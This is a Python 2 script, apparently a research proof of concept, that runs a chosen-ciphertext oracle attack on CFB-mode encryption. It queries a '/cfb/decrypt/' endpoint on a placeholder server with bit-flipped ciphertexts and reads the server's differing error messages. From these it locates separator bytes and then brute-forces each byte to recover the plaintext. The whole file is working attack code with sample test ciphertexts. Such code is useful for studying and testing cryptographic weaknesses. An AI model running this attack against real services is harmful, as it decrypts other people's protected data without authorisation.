#!/usr/bin/python

from base64 import *
from httplib import HTTPConnection

oracle_server = HTTPConnection('YOURWEBSERVER.COM:9999')

class ExceptionType:
    NORMAL = 1
    SEPERATOR = 2
    OTHEREXCEPTION = 3

def isascii(x):
    if type(x) == 'str':
        x = ord(x)
    return x >= int('20', 16) and x <= int('7E', 16)
def arrayToStr(a):
    str = ""
    for x in a:
        str += chr(x)
    return str
def printBytes(s):
    if type(s) == 'bytearray':
        s = str(s)
    str = ""
    for c in s:
        str += '%02X ' % c
    return str
def getExceptionType(ciphertext, verbosity=0):
    ciphertext = b64encode(str(ciphertext)).replace('/', '%2F').replace('+', '%2B')
    oracle_server.request("GET", '/cfb/decrypt/' + ciphertext)
    response = oracle_server.getresponse()
    data = response.read()
    if 'Invalid Code' in data:
        return (ExceptionType.SEPERATOR, data)
    elif 'Successful' in data:
        return (ExceptionType.NORMAL, data)
    else:
        return (ExceptionType.OTHEREXCEPTION, data)
def printExceptionType(type):
    if type == ExceptionType.SEPERATOR:
        return "Seperator Exception"
    elif type == ExceptionType.NORMAL:
        return "Normal    Operation"
    else:
        return "Other     Exception"
        
def findSeperators(valid_ciphertext, thoroughness=1, verbosity=0):
    if type(valid_ciphertext) != bytearray:
        valid_ciphertext = bytearray(valid_ciphertext)
    if thoroughness < 1:
        thoroughness = 1 # Need at least a level of 1
    bytes = len(valid_ciphertext)
    
    seperatorExceptionsInARow = 0
    byte_vector = [0 for i in range(bytes)]
    #Flip the LSB in each byte, see the outcome
    for i in range(bytes-1, -1, -1):
        ciphertext = valid_ciphertext[:] #Without the [:] it's copy by reference
        ciphertext[i] ^= 1
        answer, response = getExceptionType(ciphertext, verbosity)
        
        if verbosity > 0: print "[1]", "Byte Position", i
        if verbosity > 1: print "\t[2]", "Orig:", printBytes(valid_ciphertext), "XOR:", printBytes(ciphertext)
        if verbosity > 2: print "\t[3] Query:", b64encode(str(ciphertext)).replace('/', '%2F').replace('+', '%2B')
        if verbosity > 1: print "\t[2]", "Server Response:", response
        if verbosity > 0: print "\t[1]", printExceptionType(answer)
        
        if answer == ExceptionType.SEPERATOR:
            #Double/Triple Check...
            tempThoroughness = thoroughness
            seperatorExceptions = 1
            
            while tempThoroughness > 0:
                ciphertext = valid_ciphertext[:] #Without the [:] it's copy by reference
                ciphertext[i] ^= tempThoroughness+1
                answer, response = getExceptionType(ciphertext, 0)
                if answer == ExceptionType.SEPERATOR:
                    seperatorExceptions += 1
                tempThoroughness -= 1
                
                if verbosity > 1: print "\t[2]", "Orig:", printBytes(valid_ciphertext), "XOR:", printBytes(ciphertext)
                if verbosity > 2: print "\t[3] Query:", b64encode(str(ciphertext)).replace('/', '%2F').replace('+', '%2B')
                if verbosity > 1: print "\t[2]", "Server Response:", response
                if verbosity > 0: print "\t[1]", printExceptionType(answer)
                
            if seperatorExceptionsInARow >= 1 and seperatorExceptions > 1:
                if 1 not in byte_vector:
                    #First SeperatorException was actually a Seperator, and then we crossed into the prior block.
                    #This would not catch the case where there is two seperators in the last block, the earlier one on a boundary.
                    # Example: (4 byte segment size):  aabb|c|d -> [22222010] instead of [22221010]
                    # BUT, without this logic, aabb|cdd -> would yield [22222000]. This fixes it to be [22221000]
                    byte_vector[i+1] = 1
                else:
                    byte_vector[i+1] = 2
                    
                #We won't have two seperators in a row, so this means we've crossed a block boundary and are on block j-1, corrupting block j
                #this may throw a fal positive if we have a seperator on a block boundary...
                for k in range(i, -1, -1):
                    byte_vector[k] = 2
                break
            elif seperatorExceptionsInARow == 0 and seperatorExceptions > 1:
                byte_vector[i] = 3 # Possible Seperator
                seperatorExceptionsInARow += 1
            else:
                if 3 in byte_vector: byte_vector[byte_vector.index(3)] = 1 
                seperatorExceptionsInARow = 0
        else:
            #We've found a non-seperator, so confirm any outstanding seperator
            if 3 in byte_vector: byte_vector[byte_vector.index(3)] = 1 
            seperatorExceptionsInARow = 0
        if verbosity > 0: print ""
    if 3 in byte_vector: byte_vector[byte_vector.index(3)] = 1 
    
    print "[+] Found seperators at values 1 and block boundary at values 2", byte_vector
    return byte_vector
        
def decrypt(valid_ciphertext, byte_vector, onlyASCII=True, verbosity=0):    
    if type(valid_ciphertext) != bytearray:
        valid_ciphertext = bytearray(valid_ciphertext)
    bytes = len(valid_ciphertext)
    
    #This is the ciphertext with the seperator xored out
    # Sending this will generator a SeperatorException, because the number of seperators is invalid.
    ciphertext_onelessseperator = valid_ciphertext
    ciphertext_onelessseperator[byte_vector.index(1)] ^= 1
    
    #This will store the values that produce a seperator when submitted in that position
    found_values = []
    
    print "[+] Finding Intermediate Values..."
    
    #Decrypt each byte...
    for i in range(bytes):
        # Do not try to find value of seperator
        if byte_vector[i] == 1:
            found_values.append([0])
            continue 
        elif byte_vector[i] == 2:
            found_values.append([0])
            continue
        
        #If there's base64 padding, we'll get a range of SeperatorExceptions in a row.
        #  This variable tracks how many we've seen, so we can throw away four in a row
        #  but focus on the individual one we see by its lonesome.
        nonSeperatorExceptionsInARow = 0
        
        #Sometimes, especially with multi-block attacks, we get unlikely and wind up with a seperator
        # appearing thanks to chance or unluckiness.  These variables try to counteract that.
        beThorough = True #If we're not thorough, we'll exit early after finding the first seperator exception.
        seperatorExceptionsFound = [] #This will hold all the possibles
        
        b = 0
        while b < 256:
            ciphertext = ciphertext_onelessseperator[:] #Without the [:] it's copy by reference
            ciphertext[i] = b
            answer, response = getExceptionType(ciphertext, verbosity)
            
            if verbosity > 1: print "[1] Byte", i, ": New Value:", str(b).rjust(3, " ")
            if verbosity > 1: print "\t[2]", "Orig:", printBytes(ciphertext_onelessseperator), "XOR:", printBytes(ciphertext)
            if verbosity > 2: print "\t[3] Query:", b64encode(str(ciphertext)).replace('/', '%2F').replace('+', '%2B')
            if verbosity > 1: print "\t[2]", "Server Response:", response
            if verbosity > 1: print "\t[1]", printExceptionType(answer)

            if answer != ExceptionType.SEPERATOR:
                seperatorExceptionsFound.append(b)
                if not beThorough:
                    b = 256
            else:
                pass
            b += 1
            
            
        if len(seperatorExceptionsFound) < 1:
            raise Exception("Could not find a Seperator Exception for any value of Position " + str(i))
            
        if not beThorough:
            print "[+] I wasn't thorough, but I think Position", i, "has value", seperatorExceptionsFound[0]
        else:
            if len(seperatorExceptionsFound) == 1:
                print "[+] Position", i, "has value", seperatorExceptionsFound[0]
            else:
                print "[+] Position", i, "has", len(seperatorExceptionsFound), "possible values:", seperatorExceptionsFound
        found_values.append(seperatorExceptionsFound)

    print "[+] Beginning Decryption..."
    
    #Now try various seperators to guess which it might be.
    for sep in ["|"]:
        #Store the values we used (in case we don't use the first/only)
        used_values = []
        #Now build up an array of values in the plaintext.  
        decrypted_block = []
        #This holds the maximum number of 'possibilties' we saw for any individual value
        maxPossibilities = 1
        #This holds the bytes for which we saw other possibilities
        bytesThatCouldBeDifferent = []
        
        for i in range(bytes):
            if byte_vector[i] == 1:
                used_values.append(0)
                decrypted_block.append(ord(sep))
            elif byte_vector[i] == 2:
                used_values.append(0)
                decrypted_block.append(ord("?"))
            else:
                
                if len(found_values[i]) > 1 and onlyASCII:
                    bytesThatCouldBeDifferent.append(i)
                    maxPossibilities = max(maxPossibilities, len(found_values[i]))
                    
                    j = 0
                    decryptedValue = found_values[i][j] ^ valid_ciphertext[i] ^ ord(sep)
                    while not isascii(decryptedValue) and j < len(found_values[i]) - 1:
                        if verbosity > 0: print "[1] Position", i, "value", j, "is not an ASCII character, trying the next guess."
                        j += 1
                        decryptedValue = found_values[i][j] ^ valid_ciphertext[i] ^ ord(sep)
                    used_values.append(found_values[i][j])
                    decrypted_block.append(decryptedValue)
                else:
                    used_values.append(found_values[i][0])
                    decrypted_block.append(found_values[i][0] ^ valid_ciphertext[i] ^ ord(sep))
    
        if verbosity > 0: print "[1] Seperator:", sep
        if verbosity > 0: print "[1] \tUsed Intermediate Values:", used_values
        if verbosity > 0: print "[1] \tAfter XOR:               ", decrypted_block
        print "[+] Decrypted:", arrayToStr(decrypted_block)
        
        if maxPossibilities > 1:
            print "[+] However, bytes", bytesThatCouldBeDifferent, "may have up to", maxPossibilities, "alternate values."
            
#Segment Size of 16, two blocks
#aaaabbbbccccddddeeee|fffgggg|hhh (21, 28)
#valid_ciphertext = bytearray(b64decode("xbQ0lXjqZ7qeq/So+tNhesmtn/jBnJrCgHZo4Plsvsc="))
#aaaa|bbbccccddddeeeeffffgggg|hhh (4, 28)
#valid_ciphertext = bytearray(b64decode("xbQ0lWbqZ7qeq/So+tNhepNjlURld8Dl/S2fmewuScQ="))

##Segment Size of 16, two blocks
##These don't work correctly, we can not reliably find the Intermediate value in the first block
##  And relying on a SeperatorException for an extra Seperator to decrypt the final byte is not implemented (but could be)
##aaaa|bbbcccc|dddeeeeffffgggghhhh (4, 12)
##valid_ciphertext = bytearray(b64decode("xbQ0lWbqZ7qeq/So4tNheoGLwsaD7lAoHOveqpyRW7w="))
##aaa|bbbbcccc|dddeeeeffffgggghhhh (3, 12)
##valid_ciphertext = bytearray(b64decode("xbQ0iHjqZ7qeq/So4tNheleM41GLXTwehvJxHgh6jME="))

#Segment Size of 4, two blocks
#a|aab|bb
#valid_ciphertext = bytearray(b64decode("xak0lX6G3ls="))

#Segment Size of 2 bytes
##  Relying on a SeperatorException for an extra Seperator to decrypt the final bytes is not implemented (but could be)
##a|bbcc
##valid_ciphertext = bytearray(b64decode("xamkGm0A"))
##|abb
##valid_ciphertext = bytearray(b64decode("2LRDwA=="))
# These work
#aa|b
#valid_ciphertext = bytearray(b64decode("xbQeOQ=="))
#aab|
#valid_ciphertext = bytearray(b64decode("xbQAJw=="))
#|a
valid_ciphertext = bytearray(b64decode("2LQ="))

#Segment size of 3 bytes
#aaabbbcccdd|
valid_ciphertext = bytearray(b64decode("xbQ0bgDGJXW09iEK"))
#aaabbbccc|dd
#valid_ciphertext = bytearray(b64decode("xbQ0bgDGJXW07iES"))
    
seperator_vector = findSeperators(valid_ciphertext, thoroughness=7, verbosity=0)
decrypt(valid_ciphertext, seperator_vector, True, 0)